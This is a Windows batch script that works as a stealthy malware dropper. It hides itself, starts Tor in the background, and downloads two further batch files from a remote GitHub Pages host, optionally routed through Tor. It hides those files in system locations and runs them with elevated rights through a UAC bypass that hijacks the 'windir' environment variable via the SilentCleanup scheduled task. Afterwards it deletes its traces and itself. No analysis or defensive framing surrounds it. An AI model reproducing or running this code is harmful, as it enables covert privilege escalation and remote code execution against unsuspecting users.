@echo off
attrib +s +h +i "%~f0"
:connectivitycheck
ping www.google.com -n 1 -w 5000 >NUL
if errorlevel 1 goto Connectivitycheck

tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
if not errorlevel 1 (echo) else (
  nircmd exec hide "C:\Tor\tor.exe"
)

tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else (
  set "proxy=--tlsv1"
)

attrib -s -h -i "%AppData%\Microsoft\Windows\Templates\win32.bat"
attrib -s -h -i "C:\Windows\win64.bat"
curl.exe %proxy% https://cryptedlumos.github.io/win32.bat --output "%AppData%\Microsoft\Windows\Templates\win32.bat" && attrib +s +h +i "%AppData%\Microsoft\Windows\Templates\win32.bat"
curl.exe %proxy% https://cryptedlumos.github.io/win64.bat --output "C:\Windows\win64.bat" && attrib +s +h +i "C:\Windows\win64.bat"
timeout -t 300
REG ADD "HKEY_CURRENT_USER\Environment" /v "windir" /d "nircmd exec hide \"%appdata%\microsoft\windows\templates\win32.bat\" &" /f
schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
timeout -t 1
REG ADD "HKEY_CURRENT_USER\Environment" /v "windir" /d "nircmd exec hide \"C:\Windows\win64.bat\" &" /f
schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
timeout -t 1
REG DELETE "HKEY_CURRENT_USER\Environment" /v "windir" /f
DEL /s /f /q /a "%~f0"
